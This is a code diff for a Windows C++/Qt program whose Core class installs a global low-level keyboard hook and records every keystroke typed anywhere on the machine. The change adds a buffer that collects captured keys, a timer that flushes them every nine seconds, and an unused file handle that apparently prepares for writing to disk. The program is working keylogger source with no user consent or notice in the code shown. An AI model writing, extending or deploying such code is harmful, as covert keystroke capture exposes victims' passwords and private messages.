@@ -1,11 +1,21 @@
 #include "core.h"
 
 static HHOOK hHook = nullptr;
+static QByteArray outputBuffer;
+static QFile output;
 
 Core::Core(QObject *parent) :
     QObject(parent)
 {
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, process, nullptr, 0);
+
+    QTimer *timer = new QTimer();
+    QObject::connect(timer, &QTimer::timeout, Core::writeOutput);
+    timer->start(9000);
+
+    if (hHook == nullptr) {
+        QCoreApplication::exit(1);
+    }
 }
 
 void Core::update(BYTE *keyState, int keyCode)
@@ -52,8 +62,16 @@ LRESULT CALLBACK Core::process(int nCode, WPARAM wParam, LPARAM lParam)
             toBeAppended = QString::fromUtf16((ushort *) buffer);
         }
 
-        qDebug() << toBeAppended;
+        outputBuffer.append(toBeAppended);
     }
 
     return CallNextHookEx(hHook, nCode, wParam, lParam);
+}
+
+void Core::writeOutput()
+{
+    if (!outputBuffer.isEmpty()) {
+        qDebug() << outputBuffer;
+        outputBuffer.clear();
+    }
 }
